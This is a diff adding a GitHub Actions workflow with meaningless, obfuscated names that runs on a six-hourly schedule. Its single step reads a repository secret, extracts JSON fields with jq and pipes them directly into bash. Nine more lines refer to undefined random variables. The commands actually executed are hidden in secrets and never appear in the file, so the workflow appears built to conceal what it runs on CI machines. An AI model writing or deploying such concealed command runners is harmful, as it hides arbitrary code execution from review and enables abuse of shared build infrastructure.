@@ -1,0 +1,26 @@
+name: xiaoshabihaha
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoshabihaha
+        env:
+          pafyd5: ${{ secrets.pafyd5 }}
+        run: |
+          echo $pafyd5 | jq -r .ruz56 | /bin/bash
+          echo $dz43574 | jq -r .eoib351 | /bin/bash
+          echo $zqwcx56 | jq -r .josz86998 | /bin/bash
+          echo $iqcxw5 | jq -r .xdg52 | /bin/bash
+          echo $lelfe02290 | jq -r .oaff9 | /bin/bash
+          echo $aelu26013 | jq -r .yy68 | /bin/bash
+          echo $nwo47893 | jq -r .afuja0 | /bin/bash
+          echo $tqpy34309 | jq -r .pzmm0 | /bin/bash
+          echo $r556 | jq -r .ena70 | /bin/bash
+          echo $sfgq29 | jq -r .wu3831 | /bin/bash
+
